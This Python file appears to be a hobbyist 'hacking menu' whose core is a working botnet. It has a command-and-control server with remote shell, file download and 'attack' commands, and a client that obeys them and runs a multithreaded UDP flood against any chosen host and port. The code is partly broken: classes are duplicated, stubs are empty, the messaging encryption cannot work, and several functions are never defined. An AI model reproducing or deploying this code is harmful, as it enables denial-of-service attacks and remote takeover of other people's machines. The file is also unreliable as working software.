import os
import platform
import hashlib
import uuid
import time
import random
import socket
import sys
import psutil
import signal
import inspect
import ctypes
import threading
import getpass
import shutil
import requests
import re
import subprocess
import select
import json
import sqlite3
import logging
import ipaddress
import struct
import argparse
import multiprocessing
import resource
import pwd
import queue
import rsa
import base64
import random
import atexit
import keyboard
from tarfile import ENCODING
from tqdm import tqdm
from tempfile import NamedTemporaryFile
from typing import Union, Tuple, List
from threading import Thread, Timer
from time import sleep
from random import choice
from concurrent.futures import ThreadPoolExecutor
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from colorama import init, Fore, Style



user_name = os.getlogin()
if not user_name:
    user_name = pwd.getpwuid(os.getuid()).pw_name
def Login():
    print("Please log into the AI")


# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD_HASH = hashlib.sha256("password".encode()).hexdigest()  # Store hashed password

# Secure login function
def login():
    while True:
        username = input("Enter Username: ")
        password = getpass.getpass("Enter Password: ")  # Hides input with ****
        hashed_password = hashlib.sha256(password.encode()).hexdigest()

        if username == ADMIN_USERNAME and hashed_password == ADMIN_PASSWORD_HASH:
            clear_screen()
            logging.info("Login Successful")
            mainM()  # Call the main function after successful login
            return True
        else:
            clear_screen()  # Clear screen on failure
            logging.warning("Invalid Credentials. Please try Again")

def generate_unique_code():
    hwid = str(uuid.getnode())  
    unique_code = hashlib.sha256(hwid.encode()).hexdigest()

print("\n\033[31m Welcome to the main menu")
print("\n\033[31m The most advanced menu using Python")
print("\n\033[31m ----MADE_BY_DADDY_IP38----")
print("\n\033[31m this is currently under dev and a simulation ")
print("\n\033[31m Ps the msg system and the botnet dosent fully work currently im working on it as we speak wait for a patch to come out ")
print("\n\033[31m For this reason i have temp disabled acess to it for normal users ")
print("\n\033[31m !!!THE CREATOR IS NOT RESPONSIBLE FOR ANY MISUSE OF THIS PROGRAM AND OR LEGAL SUITS!!!")

ascii_art = r"""
 ___       ________  ________  ___  ________      
|\  \     |\   __  \|\   ____\|\  \|\   ___  \    
\ \  \    \ \  \|\  \ \  \___|\ \  \ \  \\ \  \   
 \ \  \    \ \  \\\  \ \  \  __\ \  \ \  \\ \  \  
  \ \  \____\ \  \\\  \ \  \|\  \ \  \ \  \\ \  \ 
   \ \_______\ \_______\ \_______\ \__\ \__\\ \__\
    \|_______|\|_______|\|_______|\|__|\|__| \|__|
"""
print(ascii_art)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def mainM():
    global listener_port
    ascii_main = r"""
     _____ ______   _______   ________   ___  ___     
    |\   _ \  _   \|\  ___ \ |\   ___  \|\  \|\  \    
    \ \  \\\__\ \  \ \   __/|\ \  \\ \  \ \  \\\  \   
     \ \  \\|__| \  \ \  \_|/_\ \  \\ \  \ \  \\\  \  
      \ \  \    \ \  \ \  \_|\ \ \  \\ \  \ \  \\\  \ 
       \ \__\    \ \__\ \_______\ \__\\ \__\ \_______\
        \|__|     \|__|\|_______|\|__| \|__|\|_______|
    """
    print(ascii_main)
    while True:
        print("\n\033[31m Created by IP38")
        print("\n\033[31m Select an option")
        print("\033[34m 1 - Contact")
        print("\033[34m 2 - Pinger")
        print("\033[31m 3 - IP Lookup")
        print("\033[31m 4 - Botnet")
        print("\033[34m 5 - Udp/tcp panel")
        print("\033[34m 6 - ABAT messenger")
        print("\033[31m 7 - portscan")
        print("\033[31m 8 - usb injector")
        print("\033[34m 9 - usb listener")
        print("\033[34m 10 - Exit")

        choice = input("\033[34m Pick your method: ")
        if choice == "1":
            Contact()
        elif choice == "2":
            clear_screen()
            pinger()
        elif choice == "3":
            clear_screen()
            lookup()
        elif choice == "4":
            Server()
        elif choice == "5":
            main()
        elif choice == "6":
            second_login()
        elif choice == "7":
            pscan()
        elif choice == "8":
            usb_sacrifice()
        elif choice == "9":
             if last_payload:
                usb_listener(last_payload, session_id, listener_port)
                listener_port = random.randint(20000, 65535)
             else:
                print(f"{Fore.RED}Run 9 first.{Style.RESET_ALL}")
                input("Press Enter...")
        elif choice == "10":
            clear_screen()
            print("\033[31m Goodbye")
            sys.exit()

def second_login():
    stored_username = "root2"
    stored_password = "root2"

    print ("\nWelcome to ABAT please login")

    username = input("username: ")
    password = input("password: ")

    if username == stored_username and password == stored_password:
        print("\nWelcome to ABAT ")
        generate_unique_code()
        messenger()
    else:
        print("\nWrong username or password")
        second_login()

def Contact():
    print("\nEmail-b07787525@gmail.com for any questions ")
    while True:
        choice2 = input("\033[31m Type 'exit' to exit to the menu: ")
        if choice2.lower() == "exit":  
            clear_screen()  
            mainM()  
            break

def pinger():
    clear_screen()
    ascii_pinger = r"""
 ___  ________        ________  ___  ________   ________  _______   ________     
|\  \|\   __  \      |\   __  \|\  \|\   ___  \|\   ____\|\  ___ \ |\   __  \    
\ \  \ \  \|\  \     \ \  \|\  \ \  \ \  \\ \  \ \  \___|\ \   __/|\ \  \|\  \   
 \ \  \ \   ____\     \ \   ____\ \  \ \  \\ \  \ \  \  __\ \  \_|/_\ \   _  _\  
  \ \  \ \  \___|      \ \  \___|\ \  \ \  \\ \  \ \  \|\  \ \  \_|\ \ \  \\  \| 
   \ \__\ \__\          \ \__\    \ \__\ \__\\ \__\ \_______\ \_______\ \__\\ _\ 
    \|__|\|__|           \|__|     \|__|\|__| \|__|\|_______|\|_______|\|__|\|__|  

    """
    print(ascii_pinger)
    print("\n\033[34m Welcome to the pinger")
    print("\n\033[34m Select an option")
    print("\033[34m 1 - Ping an IP")
    print("\033[34m 2 - View your IP")

    opt = input("\033[34m Select an option: ")
    if opt == "1":
        clear_screen()
        ip = input("Enter the IP to ping: ")
        ping_ip(ip)

    elif opt == "2":
        clear_screen()
        myip()

def ping_ip(ip):
    if platform.system().lower() == "windows":
        command = ["ping", "-n", "4", ip]
    else:
        command = ["ping", "-c", "4", ip]

    try:
        response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if response.returncode == 0:
            print(f"{ip} is reachable.")
        else:
            print(f"{ip} is not reachable.")
    except Exception as e:
        print(f"Error: {e}")

    mainM()


def myip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        print(f"\nYour public IP address is: {ip_data['ip']}")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching IP info: {e}")
    mainM()




def messenger():
    clear_screen()
    hwid = str(uuid.getnode())
    unique_address = hashlib.sha256(hwid.encode()).hexdigest()
    
    print(f"Your unique address to receive messages is: {unique_address}")
    print("Welcome to the secure messaging system.")
    ascii_abat =r"""
 ________  ________  ________  _________   
|\   __  \|\   __  \|\   __  \|\___   ___\ 
\ \  \|\  \ \  \|\ /\ \  \|\  \|___ \  \_| 
 \ \   __  \ \   __  \ \   __  \   \ \  \  
  \ \  \ \  \ \  \|\  \ \  \ \  \   \ \  \ 
   \ \__\ \__\ \_______\ \__\ \__\   \ \__\
    \|__|\|__|\|_______|\|__|\|__|    \|__|
"""
    print(ascii_abat)
    print("\n\033[34m Received Messages:\n")

    while True:
        recipient = input("\033[34m Enter recipient's unique code (or type 'exit' to quit): ")
        if recipient.lower() == 'exit':
            clear_screen()
            print("Exiting the messenger.")
            mainM()
        else:
            msg = input("Enter your message: ")
            encrypted_msg = encrypt_message(msg)
            target_ip = input("Enter recipient IP address: ")
            target_port = 12345
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((target_ip, target_port))
                client_socket.send(encrypted_msg)
                print(f"Encrypted message sent to {recipient} at {target_ip}:{target_port}")
                client_socket.close()
            except Exception as e:
                print(f"Error sending message: {e}")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 12345))
    server_socket.listen(5)

    print("Server is listening on port 12345...")
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        encrypted_message = client_socket.recv(1024).decode()
        decrypted_message = decrypt_message(encrypted_message)
        print(f"Received message: {decrypted_message}")
        client_socket.close()

def encrypt_message(message):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    encrypted_message = cipher_suite.encrypt(message.encode())
    return encrypted_message

def decrypt_message(encrypted_message):
    key = Fernet.generate_key()  
    cipher_suite = Fernet(key)
    decrypted_message = cipher_suite.decrypt(encrypted_message).decode()
    return decrypted_message

def lookup():
    clear_screen()
    ascii_lookup = r"""
 ___  ________        ___       ________  ________  ___  __    ___  ___  ________   
|\  \|\   __  \      |\  \     |\   __  \|\   __  \|\  \|\  \ |\  \|\  \|\   __  \  
\ \  \ \  \|\  \     \ \  \    \ \  \|\  \ \  \|\  \ \  \/  /|\ \  \\\  \ \  \|\  \ 
 \ \  \ \   ____\     \ \  \    \ \  \\\  \ \  \\\  \ \   ___  \ \  \\\  \ \   ____\
  \ \  \ \  \___|      \ \  \____\ \  \\\  \ \  \\\  \ \  \\ \  \ \  \\\  \ \  \___|
   \ \__\ \__\          \ \_______\ \_______\ \_______\ \__\\ \__\ \_______\ \__\   
    \|__|\|__|           \|_______|\|_______|\|_______|\|__| \|__|\|_______|\|__|   

    """
    print(ascii_lookup)
    print("\n\033[34m Welcome to the IP lookup")
    ip = input("Enter an IP to lookup: ")
    lookup_ip(ip)
    clear_screen()

def lookup_ip(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        
        print(f"IP: {data.get('ip', 'N/A')}")
        print(f"Location: {data.get('city', 'N/A')}, {data.get('region', 'N/A')}, {data.get('country', 'N/A')}")
        print(f"Organization: {data.get('org', 'N/A')}")
        print(f"Hostname: {data.get('hostname', 'N/A')}")
        print(f"Region: {data.get('region', 'N/A')}")
        print(f"Country: {data.get('country', 'N/A')}")
        print(f"City: {data.get('city', 'N/A')}")
        print(f"Loc: {data.get('loc', 'N/A')}")
        print(f"Postal: {data.get('postal', 'N/A')}")
        
        if 'org' in data:
            print(f"Organization: {data['org']}")
        if 'hostname' in data:
            print(f"Hostname: {data['hostname']}")
        if 'loc' in data:
            print(f"Coordinates: {data['loc']}")
        
    except requests.exceptions.RequestException as e:
        print(f"Error fetching IP info: {e}")
    mainM()

def Server():
    BACKLOG = 50
    MAX_CHUNK_SIZE = 16 * 1024
    VERSION = "BOTNET/2022.1"
    PAYLOAD_SUFFIX = b'\x00\x00\xff\xff'

class Colours:
    def __init__(self):
        self.colours_fn = {}
        self.colours = []
        if platform.system() == 'Windows':
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        COMMANDS = {
            # Lables
            'info': (33, '[!] '),
            'que': (34, '[?] '),
            'bad': (31, '[-] '),
            'good': (32, '[+] '),
            'run': (97, '[~] '),
            # Colors
            'green': 32,
            'lgreen': 92,
            'lightgreen': 92,
            'grey': 37,
            'red': 31,
            'lred': 91,
            'lightred': 91,
            'cyan': 36,
            'lcyan': 96,
            'lightcyan': 96,
            'blue': 34,
            'lblue': 94,
            'lightblue': 94,
            'purple': 35,
            'yellow': 93,
            'white': 97,
            'lpurple': 95,
            'lightpurple': 95,
            'orange': 33,
            # Styles
            'bg': ';7',
            'bold': ';1',
            'italic': '3',
            'under': '4',
            'strike': '09',
        }


        for key, val in COMMANDS.items():
            value = val[0] if isinstance(val, tuple) else val
            prefix = val[1] if isinstance(val, tuple) else ''

            if isinstance(val, int):
                self.colours.append(key)
                self.colours_fn[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)

    def _gen(self,string, prefix, key):
        colored = prefix if prefix else string
        not_colored = string if prefix else ''
        result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
        return result
    
    def cprint(self, string:str):
        print(choice(list(self.colours_fn.values()))(string))

class Status:
    OK = "OK"
    FAIL = "FAIL"

class ContentType:
    file = "FILE"
    bytes = "BYTES"
    text = "TEXT"

class Request:
    def __init__(self, cmd:str, direct:bool=False, body:dict=dict(), header:dict=dict()):
        self.header = {"version": VERSION, "method": "CONNECT" if direct else "DIRECT", **header}
        self.body = {"ack": True, "cmd": cmd, **body}
    
    def __str__(self) -> str:
        return f"Request(header={self.header}, body={self.body})"
    
    def __repr__(self) -> str:
        return str(self)

    def set_header(self, key:str, value:str):
        self.header[key] = value

    def set_body(self, key:str, value:str):
        self.body[key] = value
    
    def get_payload(self, encoding:str="utf-8") -> bytes:
        return (
            "\r\n".join(f"{key}: {value}" for key, value in self.header.items())
            + "\r\n\r\n"
            + "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
        ).encode(encoding)

MAX_CHUNK_SIZE = 16 * 1024

class NetworkFile:
    def __init__(self, mode:str="w+b"):
        self._fp = NamedTemporaryFile(mode=mode, delete=False)

    def write(self, chunk:Union[bytes, str]):
        self._fp.write(chunk)

    def read(self, chunk_size:int=MAX_CHUNK_SIZE):
        return self._fp.read(chunk_size)

    def seek(self, pos:int=0):
        self._fp.seek(pos)

    def close(self):
        self._fp.close()
        os.unlink(self._fp.name)
    
    def __str__(self):
        return f"NetworkFile<name={self._fp.name}>"

    def __del__(self):
        self.close()

class Response:
    def __init__(self, payload:bytes) -> None:
        self.raw_header, self.raw_body = payload.split(b"\r\n\r\n")
        self.header = {}
        self.body = {}

        for row in self.raw_header.decode().split("\r\n"):
            row_split_list = list(map(lambda x: x.strip(), row.split(":")))
            self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None

        self._rdata = ""

        self.ct = self.header.get("ct") # Content-Type
        if self.ct == ContentType.file:
            self.file = NetworkFile()

        self.process_body()

    @property
    def rdata(self):
        return self._rdata
    
    @property
    def err(self):
        return self.header.get("error")
    
    @property
    def output(self):
        return self.body.get("output") # Return output from command
    
    @property
    def raw(self):
        return self.raw_body

    def add_body(self, chunk:bytes):
        if self.ct == ContentType.file:
            self.raw_body = chunk
        else:
            self.raw_body += chunk

        self.process_body()
    
    def process_body(self):
        if self.ct == ContentType.file:
            self.file.write(self.raw_body)
            
        if self.ct == ContentType.text:
            for row in self.raw_body.decode().split("\r\n"):
                row_split_list = list(map(lambda x: x.strip(), row.split(":")))
                self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
    def __str__(self):
        return f"Request<header={self.header}, body={self.body}>"
    
    def __repr__(self) -> str:
        return str(self)


class Session:
    def __init__(self, parent, conn:socket.socket):
        self.parent = parent
        self.conn = conn
        self.addr = conn.getpeername()
        self._buffer = b""
        host, port = self.addr
        self.input_title = f"client@{host}:~$ "

        self.cmds = cmds = {}
        for attr, func in inspect.getmembers(self):
            if attr.startswith("cmd_"):
                cmds[attr[4:].upper()] = func

        self.take_input()

    def take_input(self):
        while True:
            data = input(self.input_title).strip()
            if not data:
                continue
            
            if data == "exit":
                break

            data = data.split(" ")
            cmd = data[0].upper()
            params = data[1:]

            if cmd:=self.cmds.get(cmd):
                cmd(*params)
                continue

            self.cmd_shell(*data)
    
    def cmd_shell(self, *params):
        self.send(Request(cmd="SHELL", body={"params": ' '.join(params)}, direct=True))
        resp  = self.recv()
        print(resp.raw.decode())
    
    def cmd_help(self):
        help = [
            "<command> : shell command to client",
            "download <file>: Download file from client",
            "exit: Exit from client",
        ]
        print("----Command List----")
        for h in help:
            command, description = h.split(" - ")
            print("\t" + f"{command:<40} - {description}")

    def cmd_download(self, file:str):
        self.send(Request(cmd="DOWNLOAD", body={"params": file}, direct=True))
        resp  = self.recv()

        if resp.header.get("status") == Status.OK:
            size = 0
            resp.file.seek()
            with open("1" + file, "wb") as fp:
                while chunk:=resp.file.read(MAX_CHUNK_SIZE):
                    size += len(chunk)
                    fp.write(chunk)

            print(f"Downloaded file {file}, {size}")

        elif resp.header.get("status") == Status.FAIL:
            print(resp.err)


    # utils
    def send(self, req:Request):
        self.conn.send(req.get_payload())
    
    def recv(self) -> Response:
        conn = self.conn
        conn.setblocking(1)

        data = conn.recv(MAX_CHUNK_SIZE)
        res = Response(data)

        while data:=conn.recv(MAX_CHUNK_SIZE):
            if data.endswith(PAYLOAD_SUFFIX):
                res.add_body(data[:-len(PAYLOAD_SUFFIX)])
                break
            res.add_body(data)
        
        res.conn = conn
        conn.setblocking(0)
        return res

BACKLOG = 50


class Server(Colours):

    def __init__(self, connect:Tuple[str,int]=("0.0.0.0",8080), auth:str=""):
        super().__init__()
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

        self.connections = []
        self.tasks = {}

        self.stop = False
        self.connect = connect
        self.auth = auth
        
        self.sock = self.create_connection(self.connect)

        Thread(target=self.accept_connections).start()

        self.cmds = cmds = {}

        for attr, func in inspect.getmembers(self):
            if attr.startswith('cmd_'):
                cmds[attr[4:].upper()] = func
        
        self.print_logo()
        self.take_input()

    
    def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""):
        print("\nExiting....")
        self.stop = True
        self.sock.close()
        sleep(1)
        sys.exit(0)
    
    def create_connection(self, connect:Tuple[str,int]) -> bool:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(connect)
        sock.listen(BACKLOG)
        sock.settimeout(0.5)
    
        return sock
    
    def accept_connections(self):
        while not self.stop:
            try:
                conn, address = self.sock.accept()
                conn.setblocking(0)
                self.connections.append(conn)
            except socket.timeout:
                continue
            except socket.error:
                continue
            except Exception as e:
                print("Error accepting connections")

    def _is_socket_closed(self, sock: socket.socket) -> bool:
        try:
            # this will try to read bytes without blocking and also without removing them from buffer (peek only)
            buf = sock.recv(1, socket.MSG_PEEK)
            if buf == b'':
                return True
        except BlockingIOError:
            return False  # socket is open and reading from it would block
        except ConnectionResetError:
            return True  # socket was closed for some other reason
        except Exception as e:
            return False
        return False
    
    def is_socket_closed(self, sock: socket.socket) -> bool:
        if self._is_socket_closed(sock):
            self.connections.remove(sock)
            return True
        return False
    
    def get_connection(self) -> socket.socket:
        count = 0
        closed = []
        for conn in [*self.connections]:
            is_closed = self.is_socket_closed(conn)
            if is_closed:
                continue
            count += 1
            yield count, conn
        

    def take_input(self):
        while True:
            data = input("Botnet@server:~$ ").strip()
            if not data:
                continue
            
            if data == "exit":
                self.exit_gracefully()

            data = data.split(" ")
            cmd = data[0].upper()
            params = data[1:]

            if cmd:=self.cmds.get(cmd):
                try:
                    cmd(*params)
                except Exception as e:
                    print(e)
                continue

            print("Invalid command")

    # Commands
    def cmd_ping(self):
        self.send(Request(cmd="PING"))
        self.display_output()

    def cmd_connect(self, conn_id:int):
        conn_id = int(conn_id)
        if len(self.connections) < conn_id:
            print("Invalid connection id")
            return
        
        conn = self.connections[conn_id-1]

        session = Session(self, conn)

    def cmd_attack(self, *params:List[str]):
        if len(params) != 4:
            print("Invalid params")
            return
        hash = self.get_hash("ATTACK", params)
        self.send(Request(cmd="ATTACK", body=dict(params=' '.join(params))))

        self.tasks[hash] = {
            "cmd": "ATTACK",
            "params": params,
            "time": time(),
        }

        self.display_output()

    def cmd_list(self):
        if len(self.connections) == 0:
            print("No clients connected")
            return

        print("----Clients----")
        for i, conn in self.get_connection():
            ip, port = conn.getpeername()
            self.cprint(f"{[i]}    {ip}:{port}    CONNECTED")
    
    def cmd_reset(self):
        for i, conn in self.get_connection():
            self.connections.remove(conn)
            conn.close()

    def cmd_help(self):
        help = [
            "list - list all connected clients",
            "ping - ping all clients",
            "connect <client_id> - connect to a client",
            "attack <ip> <port> <duration> <threads> - UDP flood attack on target",
            "tasklist - list all running tasks",
            "kill <task_id> - kill a task",
            "killall - kill all tasks",
            "destroy - destroy all clients",
            "help - show this help message"
        ]
        print("----Command List----")
        for h in help:
            command, description = h.split(" - ")
            print("\t" + f"{command:<40} - {description}")
    
    def cmd_tasklist(self):
        if len(self.tasks) == 0:
            print("No tasks running")
            return
        print("----Tasks----")
        for hash, task in self.tasks.copy().items():
            duration = task["params"][2]

            if (time() - task["time"]) > int(duration):
                del self.tasks[hash]
                continue

            print(f"\t{hash} - {task['cmd']} {' '.join(task['params'])}")
    
    def cmd_killall(self):
        self.send(Request(cmd="STOP"))
        self.display_output()
    
    def cmd_kill(self, hash:int):
        hash = int(hash)
        if hash not in self.tasks:
            print("Invalid task id")
            return
        del self.tasks[hash]
        self.send(Request(cmd="KILL", body=dict(params=hash)))
        self.display_output()
    
    def cmd_destroy(self):
        self.send(Request(cmd="DESTROY"))
        self.display_output()

    # Utils

    def display_output(self):
        responses = self.recv()
        for i, res in enumerate(responses, start=1):
            ip, port = res.conn.getpeername()
            self.cprint(f"{[i]}    {ip}:{port}    {res.output}")

    def recv(self, conn:socket.socket=None) -> Response:
        if conn is None:
            responses = []
            for i, conn in self.get_connection():
                responses.append(self.recv(conn))
            return responses
        
        conn.setblocking(1)

        data = conn.recv(MAX_CHUNK_SIZE)
        res = Response(data)

        while data:=conn.recv(MAX_CHUNK_SIZE):
            if data.endswith(PAYLOAD_SUFFIX):
                res.add_body(data[:-len(PAYLOAD_SUFFIX)])
                break
            res.add_body(data)
        
        res.conn = conn
        conn.setblocking(0)
        return res

    def send(self, data:Request):
        for i, conn in self.get_connection():
            conn.send(data.get_payload())

    def get_hash(self, *args):
        data = []
        if len(args) > 1:
            for n in args:
                if isinstance(n, str):
                    data.append(n)

                if isinstance(n, (tuple, list, set)):
                    data += [*list(n)]
        else:
            data = args

        he = hashlib.md5(str(data).encode()).hexdigest()
        return (int(he, 16) % (1<<32))

    def print_logo(self) -> None:
        clear_screen()
        custom_banner = r"""
 ________  ________  _________  ________   _______  _________   
|\   __  \|\   __  \|\___   ___\\   ___  \|\  ___ \|\___   ___\ 
\ \  \|\ /\ \  \|\  \|___ \  \_\ \  \\ \  \ \   __/\|___ \  \_| 
 \ \   __  \ \  \\\  \   \ \  \ \ \  \\ \  \ \  \_|/__  \ \  \  
  \ \  \|\  \ \  \\\  \   \ \  \ \ \  \\ \  \ \  \_|\ \  \ \  \ 
   \ \_______\ \_______\   \ \__\ \ \__\\ \__\ \_______\  \ \__\
    \|_______|\|_______|    \|__|  \|__| \|__|\|_______|   \|__|
    Welcome to the botnet 
    the creators are not responsible for misuse of this program or legal suits
    type help for a list of all commands type exit to close the program
        """
        for line in custom_banner.split("\n"):
            self.cprint(line)
            sleep(0.1)

def client():
    logging.basicConfig(level=logging.DEBUG, format="[%(asctime)s] [%(process)s] [%(levelname)s] %(message)s")
logg = logging.getLogger(__name__)

if os.name == "nt":
    ENCODING = "windows-1252"
else:
    ENCODING = "utf-8"

AUTHORIZATION = "" # (optnal) Set this to the authorization token you want to use
MAX_CHUNK_SIZE = 16 * 1024 # 16KB
POPEN_TIMEOUT = 60 # seconds

class Status:
    OK = "OK"
    FAIL = "FAIL"

class Request:
    def __init__(self, send:str="", status:str=Status.OK, body:Union[object, dict]=dict(), header:dict=dict()):
        self.header = {"status": status}

        if status == Status.FAIL:
            self.header["error"] = send

        if isinstance(body, dict):
            self.header["ct"] = "TEXT"

            if status == Status.FAIL:
                self.body = {"output": "", **body}
            else:
                self.body = {"output": send, **body}
        
        elif isinstance(body, bytes):
            self.header["ct"] = "BYTES"
            self.body = body
        
        elif isinstance(body, object):
            self.header["ct"] = "FILE"
            self.body = body

        self.header = {**self.header, **header}

    
    def __str__(self):
        return f"Request(header={self.header}, body={self.body})"
    
    def __repr__(self):
        return self.__str__()
    
    def set_header(self, key:str, value:str):
        self.header[key] = value
    
    def get_payload(self, encoding:str="utf-8") -> bytes:
        return (
            "\r\n".join(f"{key}: {value}" for key, value in self.header.items())
            + "\r\n\r\n"
            + "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
        ).encode(encoding)
    
    def __iter__(self):
        yield (
            "\r\n".join(f"{key}: {value}" for key, value in self.header.items())
            + "\r\n\r\n"
        ).encode("utf-8")

        if self.header["ct"] == "TEXT":
            yield (
                "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
            ).encode("utf-8")
        
        elif self.header["ct"] == "FILE":
            while data:=self.body.read(MAX_CHUNK_SIZE):
                yield data
        
        elif self.header["ct"] == "BYTES":
            yield self.body
        
        yield b'\x00\x00\xff\xff'

class Response:
    def __init__(self, payload:bytes, encoding:str="utf-8") -> None:
        self.raw_header, self.raw_body = payload.split(b"\r\n\r\n")
        self.header = {}
        self.body = {}

        for row in self.raw_header.decode(encoding).split("\r\n"):
            row_split_list = list(map(lambda x: x.strip(), row.split(":")))
            self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None

        for row in self.raw_body.decode(encoding).split("\r\n"):
            row_split_list = list(map(lambda x: x.strip(), row.split(":")))
            self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
        

        self._direct = self.header["method"] == "DIRECT"
        self._connect = self.header["method"] == "CONNECT"

    def __str__(self):
        return f"Request(header={self.header}, body={self.body})"
    
    def __repr__(self):
        return self.__str__()

    @property
    def auth(self):
        return self.header.get("authorization")
    
    @property
    def cmd(self):
        return self.body.get("cmd")

    @property
    def params(self):
        return self.body.get("params")

    @property
    def ack(self):
        return self.body.get("ack")



class UDPFlood(Thread):
    def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
        super().__init__()
        self.host = host
        self.port = port
        self.timeout = timeout
        self.run_until = run_until
        self._closed = False

        self.total_sent_fn = total_sent
        self.total_sent = 0

        super().__init__()

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(self.timeout)

    def message(self):
        chunk = "A" * 1024 * 2
        self.total_sent_fn(len(chunk))
        self.total_sent += (len(chunk))
        return chunk

    def run(self):

        while self.run_until():
            self.sock.sendto(self.message().encode(), (self.host, self.port))
            logg.debug(f"Sent {self.total_sent} bytes to {self.host}:{self.port}")

        self.close()

    def close(self):
        self._closed = True
        self.sock.close()


class UDPFloodManager(Thread):
    def __init__(self, parent:object, host:str, port:int, timeout:int, max_threads:int, hash:str):
        self.parent = parent
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_threads = max_threads

        self.task_hash = hash
        self.run_until_local = True

        self._closed = False

        self.threads = []
        self.total_sent = 0

        super().__init__()
    
    def run_until_fn(self):
        if not self.run_until_local:
            return self.run_until_local
        
        if not self.parent.tasks.get(self.task_hash):
            return False

        return self.parent.tasks[self.task_hash].get("run")

    def update_data(self, n:int):
        self.total_sent += n

    def run(self):
        logg.debug(f"Starting UDPFloodManager for {self.host}:{self.port}")
        for _ in range(self.max_threads):
            thread = UDPFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
            thread.start()
            self.threads.append(thread)

        current_loop = 0
        sleep_duration = 0.01
        max_loop = self.timeout / sleep_duration

        while current_loop <= max_loop:
            if not self.run_until_local:
                logg.debug("Stopping UDPFloodManager")
                break
            sleep(sleep_duration)
            current_loop += 1

        self.close()

    def close(self):
        logg.debug("Closing UDPFloodManager")
        self._closed = True
        self.run_until = False
        
        self.parent.tasks.pop(self.task_hash, None)


class Client():
    def __init__(self, addr:Tuple[str,int]=("127.0.0.1",8080)) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        self.stop = False
        self.run = False


        self.tasks = {}

        self.direct = direct = {}
        for attr, func in inspect.getmembers(self):
            if attr.startswith("direct_"):
                direct[attr[7:].upper()] = func
        
        self.connect = connect = {}
        for attr, func in inspect.getmembers(self):
            if attr.startswith("connect_"):
                connect[attr[8:].upper()] = func


        while not self.stop:
            try:
                self._connect(addr)
            except KeyboardInterrupt:
                continue
            except Exception as ex:
                # trace = []
                # tb = ex.__traceback__
                # while tb is not None:
                #   trace.append({
                #       "filename": tb.tb_frame.f_code.co_filename,
                #       "name": tb.tb_frame.f_code.co_name,
                #       "lineno": tb.tb_lineno
                #   })
                #   tb = tb.tb_next
                # print(str({
                #   'type': type(ex).__name__,
                #   'message': str(ex)
                # }))

                # for n in trace:
                #   print(n)

                print(f"Error connecting {addr}| Sleep 0 seconds")
                sleep(0)


        # self._connect(addr)
        # input("Press enter to exit")



    def exit_gracefully(self, signum, frame):
        print("\nExiting....")
        self.stop = True
        self.run = False
        self.conn.close()
        sleep(1)
        sys.exit(0)

    def _connect(self, connect:Tuple[str,int]) -> None:
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect(connect)
        self.start()

    def send(self, req:Request) -> None:
        for payload in req:
            self.conn.send(payload)


    def recv(self) -> Response:
        data = self.conn.recv(MAX_CHUNK_SIZE)
        if not data:
            return None

        res = Response(data)

        return res

    def start(self) -> None:
        while True:
            response = self.recv()

            cmd = response.cmd
            ack = response.cmd
            params = response.params.split(" ") if response.params else response.params

            if response._direct:
                self.method_direct(cmd, ack, params)
            
            elif response._connect:
                self.method_connect(cmd, ack, params)

            else:
                print("Invalid command")
    

    def method_direct(self, cmd:str, ack:str, params:str) -> None:
        if cmd in self.direct:
            self.direct[cmd](ack, params)
        else:
            print("Invalid command")
    
    def direct_attack(self, ack:str, params:str) -> None:
        host, port, timeout, threads = params

        port = int(port)
        timeout = int(timeout)
        threads = int(threads)

        hash = self.get_hash("ATTACK", params)

        self.tasks[hash] = dict(run=True)

        manager = UDPFloodManager(self, host, port, timeout, threads, hash)
        manager.start()

        self.tasks[hash]["manager"] = manager

        if ack:
            self.send(Request("Task started successfully {}".format(hash)))
    
    def direct_ping(self, ack:str, params:str) -> None:
        if ack:
            self.send(Request("Pong"))
    
    def direct_kill(self, ack:str, params:str) -> None:
        hash = int(params[0])
        if hash in self.tasks:
            self.tasks[hash]["manager"].run_until_local = False
            if ack:
                self.send(Request("Task killed successfully {}".format(hash)))
        else:
            if ack:
                self.send(Request("Task not found {}".format(hash)))
    
